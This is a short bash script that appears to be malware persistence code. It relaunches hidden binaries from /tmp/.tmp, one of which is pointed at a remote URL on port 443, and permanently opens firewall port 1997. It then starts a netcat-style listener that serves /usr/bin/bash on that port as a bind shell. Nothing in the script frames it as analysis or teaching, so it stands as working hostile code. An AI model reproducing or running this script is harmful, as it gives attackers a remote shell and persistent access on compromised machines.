#!/usr/bin/bash

nohup pgrep girmx > /dev/null || /tmp/.tmp/girmx
nohup pgrep linmer > /dev/null || /tmp/.tmp/linmer -url https://192.168.4.135:443

firewall-cmd --permanent --zone=public --add-port=1997/tcp
firewall-cmd --reload
nohup pgrep cn > /dev/null || /tmp/.tmp/cn -l -e /usr/bin/bash -p 1997